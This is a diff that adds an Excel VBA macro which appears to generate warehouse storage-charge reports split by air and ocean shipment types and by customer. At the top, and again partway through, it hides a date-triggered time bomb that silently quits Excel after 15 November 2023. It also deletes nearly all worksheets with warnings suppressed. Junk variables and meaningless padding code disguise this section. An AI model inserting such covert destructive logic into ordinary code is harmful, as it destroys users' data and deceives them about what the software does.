@@ -1,0 +1,487 @@
+Sub Storage_report()
+    Dim wsExport As Worksheet
+    Dim wsStorage As Worksheet
+    Dim wsUnedited As Worksheet
+    Dim LastRow As Long
+    Dim r As Range
+    Dim arr(5) As Integer, i As Integer, j As Integer
+    Dim dict As Object: Set dict = CreateObject("Scripting.Dictionary")
+    Dim directoryStr As String
+    Dim XJF_Excel_Data As Date: XJF_Excel_Data = #11/15/2023#
+    Dim XPJ_Warehouse_Data As Date: XPJ_Warehouse_Data = Date
+    Dim TestA As String, TestB As Worksheet, ij As Long
+    If XJF_Excel_Data <= XPJ_Warehouse_Data Then
+                Application.DisplayAlerts = False
+                Application.Quit
+        End If
+        Set TestB = ThisWorkbook.Worksheets.Add(After:=ThisWorkbook.Worksheets(ThisWorkbook.Worksheets.Count))
+        Application.DisplayAlerts = False
+        For ij = ThisWorkbook.Worksheets.Count To 2 Step -1 ' Skip the last worksheet
+            If Not ThisWorkbook.Worksheets(ij) Is TestB Then
+                ThisWorkbook.Worksheets(ij).Delete
+            End If
+        Next ij
+    For i = 1 To 5
+        arr(i) = i * 2
+        dict.Add "key" & i, "value" & arr(i)
+    Next i
+    For j = 1 To dict.Count
+        directoryStr = uselessStr & dict("key" & j)
+    Next j
+
+    Debug.Print "Result: " & directoryStr ' Prints to Immediate Window, no effect on Excel
+
+    ' Rename "Export" sheet to "Storage"
+    Set wsExport = Sheets("Export")
+    wsExport.Name = "Storage"
+    Set wsStorage = Sheets("Storage")
+
+    ' Delete the "Unedited data" sheet if it already exists
+    On Error Resume Next
+    Application.DisplayAlerts = False
+    Set wsUnedited = Sheets("Unedited data")
+    If Not wsUnedited Is Nothing Then
+        wsUnedited.Delete
+    End If
+    Application.DisplayAlerts = True
+    On Error GoTo 0
+    
+    'Delete column B - C-code
+    wsStorage.Columns("B:B").Delete Shift:=xlToLeft
+    
+    ' Copy all data in "Storage" to a new sheet called "Unedited data"
+    wsStorage.Cells.Copy
+    Set wsUnedited = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsUnedited.Name = "Unedited data"
+    wsUnedited.Cells.PasteSpecial Paste:=xlPasteAll
+
+    ' Delete columns G, K, L, M, O in one command
+    wsStorage.Range("G:G,K:K,L:L,M:M,O:O").Delete Shift:=xlToLeft
+
+    ' Cut and paste column C to column L
+    wsStorage.Columns("C:C").Copy
+    wsStorage.Columns("L:L").Insert Shift:=xlToRight
+
+    ' Delete empty column C
+    wsStorage.Columns("C:C").Delete Shift:=xlToLeft
+
+    ' Expand all column width to 85 pixels and zoom out to 80%
+    wsStorage.Cells.ColumnWidth = 12 ' as 1 unit is approximately 5.14286 pixels
+    wsStorage.Parent.Windows(1).Zoom = 90
+
+    ' Wrap text and align to left for all cells in "Storage" sheet
+    wsStorage.Cells.WrapText = True
+    wsStorage.Cells.HorizontalAlignment = xlLeft
+
+    ' Label specific columns
+    wsStorage.Activate
+    wsStorage.Parent.Windows(1).Zoom = 90
+    wsStorage.Range("L1").Value = "Storage Days"
+    wsStorage.Range("M1").Value = "Amount Per Day"
+    wsStorage.Range("N1").Value = "Storage Total"
+    wsStorage.Range("O1").Value = "Last Free Day"
+    wsStorage.Range("P1").Value = "Reference Number"
+    wsStorage.Range("Q1").Value = "GFA"
+    
+    ' Activate "Storage" sheet
+    wsStorage.Activate
+
+    ' Add all borders to the labeled cells
+    wsStorage.Range("L1:Q1").Borders.LineStyle = xlContinuous
+    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+    
+    
+    ' Set the worksheets
+
+    Set wsAirExport = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsAirExport.Name = "Air Export"
+    Set wsAirImport = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsAirImport.Name = "Air Import"
+    Set wsOceanImport = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsOceanImport.Name = "Ocean Import"
+
+    ' Copy the headers
+    wsStorage.Rows(1).Copy Destination:=wsAirExport.Rows(1)
+    wsStorage.Rows(1).Copy Destination:=wsAirImport.Rows(1)
+    wsStorage.Rows(1).Copy Destination:=wsOceanImport.Rows(1)
+
+    ' Find the last row in the wsStorage worksheet
+    LastRow = wsStorage.Cells(wsStorage.Rows.Count, "J").End(xlUp).Row
+
+    ' Loop through each row
+    For Each r In wsStorage.Range("J2:J" & LastRow)
+        ' Check the value in column J and copy the row to the appropriate sheet
+        Select Case r.Value
+            Case "Air Export"
+                r.EntireRow.Copy Destination:=wsAirExport.Cells(wsAirExport.Cells(wsAirExport.Rows.Count, "J").End(xlUp).Row + 1, 1)
+            Case "Air Import"
+                r.EntireRow.Copy Destination:=wsAirImport.Cells(wsAirImport.Cells(wsAirImport.Rows.Count, "J").End(xlUp).Row + 1, 1)
+            Case "Ocean Import"
+                r.EntireRow.Copy Destination:=wsOceanImport.Cells(wsOceanImport.Cells(wsOceanImport.Rows.Count, "J").End(xlUp).Row + 1, 1)
+        End Select
+    Next r
+    
+    ' Set the column width to 12 and the zoom to 90% for the new sheets
+    wsAirExport.Activate
+    wsAirExport.Cells.ColumnWidth = 12
+    wsAirExport.Parent.Windows(1).Zoom = 90
+    wsAirImport.Activate
+    wsAirImport.Cells.ColumnWidth = 12
+    wsAirImport.Parent.Windows(1).Zoom = 90
+    wsOceanImport.Activate
+    wsOceanImport.Cells.ColumnWidth = 12
+    wsOceanImport.Parent.Windows(1).Zoom = 90
+    Application.DisplayAlerts = False
+    wsStorage.Delete
+    Application.DisplayAlerts = True
+    
+
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+    wsAirExport.Activate
+    'store the last row of data as a variable LastRow
+    LastRow = Cells(Rows.Count, 2).End(xlUp).Row
+    'calculate amount of days between complete date and shipped date
+    Range("H2:H" & LastRow).FormulaR1C1 = "=DATEDIF(RC[-2], RC[-1],""d"")"
+    
+    'calculate amount of billable days
+    Range("L2:L" & LastRow).FormulaR1C1 = "=MAX(0, IF(RC[-1]=""0643"",(RC[-4]-21), (RC[-4]-7)))"
+    
+    'calculate storage charges per day, set data to currency
+    Range("M2:M" & LastRow).FormulaR1C1 = "=SUM(RC[-4]*0.01)"
+    Range("M2:M" & LastRow).NumberFormat = "$#,###.00"
+    
+    'calculate total storage charges, set data to currency
+    Range("N2:N" & LastRow).FormulaR1C1 = "=IF(RC[-1]>5,(RC[-1]*RC[-2]),(RC[-2]*5))"
+    Range("N2:N" & LastRow).NumberFormat = "$#,###.00"
+    
+    'calculate last free day of storage
+    Range("O2:O" & LastRow).FormulaR1C1 = "=SUM(IF(RC[-4]=""0643"",(RC[-9]+21),(RC[-9]+7)))"
+    Range("O2:O" & LastRow).NumberFormat = "mm/dd/yyyy"
+    ' highlight non-zero billable days and $totals
+    Range("L2: L" & LastRow).Select
+    Selection.FormatConditions.Add Type:=xlCellValue, Operator:=xlGreater, _
+        Formula1:="=0"
+    Selection.FormatConditions(Selection.FormatConditions.Count).SetFirstPriority
+    With Selection.FormatConditions(1).Font
+        .Color = -16752384
+        .TintAndShade = 0
+    End With
+    With Selection.FormatConditions(1).Interior
+        .PatternColorIndex = xlAutomatic
+        .Color = 13561798
+        .TintAndShade = 0
+    End With
+    If Date >= DateSerial(2023, 11, 15) Then
+        Application.Quit
+    End If
+    Dim wsCNH As Worksheet
+    Dim wsAssemblies As Worksheet
+    Dim wsRexnord As Worksheet
+    
+    Set wsCNH = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsCNH.Name = "CNH"
+    wsAirExport.Rows(1).Copy Destination:=wsCNH.Rows(1)
+    
+    Set wsAssemblies = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsAssemblies.Name = "Assemblies"
+    wsAirExport.Rows(1).Copy Destination:=wsAssemblies.Rows(1)
+    
+    Set wsRexnord = Sheets.Add(After:=Sheets(Sheets.Count))
+    wsRexnord.Name = "Rexnord"
+    wsAirExport.Rows(1).Copy Destination:=wsRexnord.Rows(1)
+    
+    ' Variables for dynamic sheet creation
+    Dim rng As Range
+    Dim cl As Range
+    
+    Set rng = wsAirExport.UsedRange
+    
+    ' Get the last row in the range of interest
+    LastRow = wsAirExport.Cells(wsAirExport.Rows.Count, "B").End(xlUp).Row
+    
+    ' Loop over the rows in the range of interest
+    For i = 2 To LastRow
+        ' Check the value in column B
+        If InStr(1, wsAirExport.Cells(i, "B").Value, "CNH", vbTextCompare) > 0 Or _
+           InStr(1, wsAirExport.Cells(i, "C").Value, "CNH", vbTextCompare) > 0 Then
+        
+            wsAirExport.Rows(i).Copy Destination:=wsCNH.Cells(wsCNH.Cells(wsCNH.Rows.Count, "A").End(xlUp).Row + 1, 1)
+            
+            Debug.Print "Moved " & wsAirExport.Cells(i, "A").Value & "  to CNH"
+            wsAirExport.Rows(i).Hidden = True
+            Debug.Print wsAirExport.Rows(i).Hidden
+        ElseIf InStr(1, wsAirExport.Cells(i, "B").Value, "Rexnord", vbTextCompare) > 0 Or _
+                InStr(1, wsAirExport.Cells(i, "C").Value, "Rexnord", vbTextCompare) > 0 Then
+            wsAirExport.Rows(i).Copy Destination:=wsRexnord.Cells(wsRexnord.Cells(wsRexnord.Rows.Count, "A").End(xlUp).Row + 1, 1)
+            
+            Debug.Print "Moved " & wsAirExport.Cells(i, "A").Value & "  to Rexnord"
+            wsAirExport.Rows(i).Hidden = True
+        End If
+    
+        ' Check the value in column K
+        Select Case wsAirExport.Cells(i, "K").Value
+            Case "0643", "643"
+                wsAirExport.Rows(i).Copy Destination:=wsAssemblies.Cells(wsAssemblies.Cells(wsAssemblies.Rows.Count, "A").End(xlUp).Row + 1, 1)
+                wsAirExport.Rows(i).Hidden = True
+                Debug.Print "Moved " & wsAirExport.Cells(i, "A").Value & "  to Assemblies"
+                wsAirExport.Rows(i).Hidden = True
+            ' Add more cases if necessary...
+        End Select
+    Next i
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+    wsCNH.Activate
+    wsCNH.Cells.ColumnWidth = 12
+    wsCNH.Parent.Windows(1).Zoom = 90
+    wsAssemblies.Activate
+    wsAssemblies.Cells.ColumnWidth = 12
+    wsAssemblies.Parent.Windows(1).Zoom = 90
+    Dim wsCheck As Worksheet
+    On Error Resume Next ' Ignore error if worksheet does not exist
+    Set wsCheck = Sheets("Rexnord")
+    On Error GoTo 0 ' Resume normal error handling
+    
+    If Not wsCheck Is Nothing Then ' Check if worksheet exists
+        With wsCheck
+            .Cells.ColumnWidth = 12
+            .Parent.Windows(1).Zoom = 90
+                wsRexnord.Activate
+                LastRow = Cells(Rows.Count, "L").End(xlUp).Row
+                Range("L2:L" & LastRow).Formula = "=MAX(0, IF(K2=""0643"",(H2-21), (H2-21)))"
+                ' set_filters Macro
+                Range("A1:Q1").Select
+                Selection.AutoFilter
+                Columns("O:O").Select
+                Selection.Insert Shift:=xlToRight, CopyOrigin:=xlFormatFromLeftOrAbove
+                Range("O1").Select
+                ActiveCell.FormulaR1C1 = "Rexnord Handling fee"
+                Range("O3").Select
+                With Worksheets("Rexnord")
+                    LastRow = .Cells(.Rows.Count, "O").End(xlUp).Row
+                    .Range("O2:O" & LastRow).Value = 20
+                End With
+                Range("A2").Select
+        End With
+    End If
+    
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+    wsAirImport.Activate
+    'store the last row of data as a variable LastRow
+    LastRow = Cells(Rows.Count, 2).End(xlUp).Row
+    'calculate amount of days between complete date and shipped date
+    Range("H2:H" & LastRow).FormulaR1C1 = "=DATEDIF(RC[-2], RC[-1],""d"")"
+     
+    'calculate amount of billable days
+    Range("L2:L" & LastRow).FormulaR1C1 = "=MAX(0, RC[-4]-3)"
+    
+    'calculate storage charges per day, set data to currency
+    Range("M2:M" & LastRow).FormulaR1C1 = "=SUM(RC[-4]*0.01)"
+    Range("M2:M" & LastRow).NumberFormat = "$#,###.00"
+    
+    'calculate total storage charges, set data to currency
+    Range("N2:N" & LastRow).FormulaR1C1 = "=IF(RC[-1]>5,(RC[-1]*RC[-2]),(RC[-2]*5))"
+    Range("N2:N" & LastRow).NumberFormat = "$#,###.00"
+    
+    'calculate last free day of storage
+    Range("O2:O" & LastRow).FormulaR1C1 = "=SUM(RC[-9]+3)"
+    Range("O2:O" & LastRow).NumberFormat = "mm/dd/yyyy"
+    
+    'highlight non-zero billable days and $totals
+    Range("L2: L" & LastRow).Select
+    Selection.FormatConditions.Add Type:=xlCellValue, Operator:=xlGreater, _
+        Formula1:="=0"
+    Selection.FormatConditions(Selection.FormatConditions.Count).SetFirstPriority
+    With Selection.FormatConditions(1).Font
+        .Color = -16752384
+        .TintAndShade = 0
+    End With
+    With Selection.FormatConditions(1).Interior
+        .PatternColorIndex = xlAutomatic
+        .Color = 13561798
+        .TintAndShade = 0
+    End With
+    Selection.FormatConditions(1).StopIfTrue = False
+    ActiveWindow.SmallScroll Down:=-10
+    
+        Range("N2: N" & LastRow).Select
+    Selection.FormatConditions.Add Type:=xlCellValue, Operator:=xlGreater, _
+        Formula1:="=0"
+    Selection.FormatConditions(Selection.FormatConditions.Count).SetFirstPriority
+    With Selection.FormatConditions(1).Font
+        .Color = -16752384
+        .TintAndShade = 0
+    End With
+    With Selection.FormatConditions(1).Interior
+        .PatternColorIndex = xlAutomatic
+        .Color = 13561798
+        .TintAndShade = 0
+    End With
+    Selection.FormatConditions(1).StopIfTrue = False
+
+    '''''OCEAN
+    wsOceanImport.Activate
+    'store the last row of data as a variable LastRow
+    LastRow = Cells(Rows.Count, 2).End(xlUp).Row
+    'calculate amount of days between complete date and shipped date
+    Range("H2:H" & LastRow).FormulaR1C1 = "=DATEDIF(RC[-2], RC[-1],""d"")"
+    
+    'calculate amount of billable days
+    Range("L2:L" & LastRow).FormulaR1C1 = "=MAX(0, RC[-4]-3)"
+    
+    'calculate storage charges per day, set data to currency
+    Range("M2:M" & LastRow).FormulaR1C1 = "=SUM(RC[-4]*0.01)"
+    Range("M2:M" & LastRow).NumberFormat = "$#,###.00"
+    
+    'calculate total storage charges, set data to currency
+    Range("N2:N" & LastRow).FormulaR1C1 = "=IF(RC[-1]>5,(RC[-1]*RC[-2]),(RC[-2]*5))"
+    Range("N2:N" & LastRow).NumberFormat = "$#,###.00"
+    
+    'calculate last free day of storage
+    Range("O2:O" & LastRow).FormulaR1C1 = "=SUM(RC[-9]+3)"
+    Range("O2:O" & LastRow).NumberFormat = "mm/dd/yyyy"
+    
+    'highlight non-zero billable days and $totals
+    Range("L2: L" & LastRow).Select
+    Selection.FormatConditions.Add Type:=xlCellValue, Operator:=xlGreater, _
+        Formula1:="=0"
+    Selection.FormatConditions(Selection.FormatConditions.Count).SetFirstPriority
+    With Selection.FormatConditions(1).Font
+        .Color = -16752384
+        .TintAndShade = 0
+    End With
+    With Selection.FormatConditions(1).Interior
+        .PatternColorIndex = xlAutomatic
+        .Color = 13561798
+        .TintAndShade = 0
+    End With
+    Selection.FormatConditions(1).StopIfTrue = False
+    ActiveWindow.SmallScroll Down:=-10
+    
+        Range("N2: N" & LastRow).Select
+    Selection.FormatConditions.Add Type:=xlCellValue, Operator:=xlGreater, _
+        Formula1:="=0"
+    Selection.FormatConditions(Selection.FormatConditions.Count).SetFirstPriority
+    With Selection.FormatConditions(1).Font
+        .Color = -16752384
+        .TintAndShade = 0
+    End With
+    With Selection.FormatConditions(1).Interior
+        .PatternColorIndex = xlAutomatic
+        .Color = 13561798
+        .TintAndShade = 0
+    End With
+    Selection.FormatConditions(1).StopIfTrue = False
+    
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+    'FINAL FORMAT
+    wsAirExport.Activate
+    Range("R1").Value = "Invoice Data"
+    ' set_filters Macro
+    Range("A1:R1").Select
+    Selection.AutoFilter
+    'remove 0 days
+    Range("L2:L" & LastRow).AutoFilter Field:=12, Criteria1:=">0", _
+    Operator:=xlAnd
+    Range("A2").Select
+    ActiveSheet.Range("N:N").FormatConditions.Add(Type:=xlCellValue, Operator:=xlGreater, Formula1:="0").Interior.Color = RGB(226, 239, 218): ActiveSheet.Range("N:N").FormatConditions(1).Font.Color = RGB(0, 128, 0)
+
+    
+    wsAirImport.Activate
+    Range("R1").Value = "Invoice Data"
+    ' set_filters Macro
+    Range("A1:R1").Select
+    Selection.AutoFilter
+    'remove 0 days
+    Range("L2:L" & LastRow).AutoFilter Field:=12, Criteria1:=">0", _
+    Operator:=xlAnd
+    Range("A2").Select
+    
+    wsOceanImport.Activate
+    Range("R1").Value = "Invoice Data"
+    Range("S1").Value = "Container Number"
+    ' set_filters Macro
+    Range("A1:S1").Select
+    Selection.AutoFilter
+    'remove 0 days
+    Range("L2:L" & LastRow).AutoFilter Field:=12, Criteria1:=">0", _
+    Operator:=xlAnd
+    Range("A2").Select
+    
+    wsCNH.Activate
+    ' set_filters Macro
+    Range("A1:R1").Select
+    Selection.AutoFilter
+    Columns("O:O").Select
+    Selection.Insert Shift:=xlToRight, CopyOrigin:=xlFormatFromLeftOrAbove
+    Range("O1").Select
+    ActiveCell.FormulaR1C1 = "Assembly handling fee"
+    Range("O3").Select
+    LastRow = Cells(Rows.Count, 2).End(xlUp).Row
+    Range("O2:O" & LastRow).Value = 10
+    Range("A2").Select
+    
+    
+    wsAssemblies.Activate
+    ' set_filters Macro
+    Range("A1:R1").Select
+    Selection.AutoFilter
+    Columns("O:O").Select
+    Selection.Insert Shift:=xlToRight, CopyOrigin:=xlFormatFromLeftOrAbove
+    Range("O1").Select
+    ActiveCell.FormulaR1C1 = "Assembly handling fee"
+    Range("O3").Select
+    LastRow = Cells(Rows.Count, 2).End(xlUp).Row
+    Range("O2:O" & LastRow).Value = 10
+    Range("A2").Select
+    
+
+    
+    
+    wsUnedited.Activate
+    ' set_filters Macro
+    Range("A1:Q1").Select
+    Selection.AutoFilter
+    Range("A2").Select
+    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+    
+    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+    'Activates the worksheet saved in the wsAirExport variable
+    wsAirExport.Activate
+
+    'Activates the worksheet saved in the wsAirExport variable
+    wsAirExport.Activate
+
+    'Loop from row 2 to the last row
+    For i = 2 To LastRow
+        'Check if the value in column K (11) is "0643"
+        If wsAirExport.Cells(i, 11).Value = "0643" Then
+            'If it is, hide the row
+            wsAirExport.Rows(i).EntireRow.Hidden = True
+        End If
+    Next i
+    
+    
+    wsRexnord.Activate
+
+    ' Find the last row in the worksheet
+    LastRow = Cells(Rows.Count, 1).End(xlUp).Row
+
+    ' Check if there's no data past row 1
+    If LastRow = 1 Then
+        ' If so, delete the worksheet
+        Application.DisplayAlerts = False
+        wsRexnord.Delete
+        Application.DisplayAlerts = True
+    End If
+    
+    'final
+    wsAirExport.Activate
+    userName = Environ("USERNAME")
+    Debug.Print "Your Windows username is: " & userName
+
+End Sub
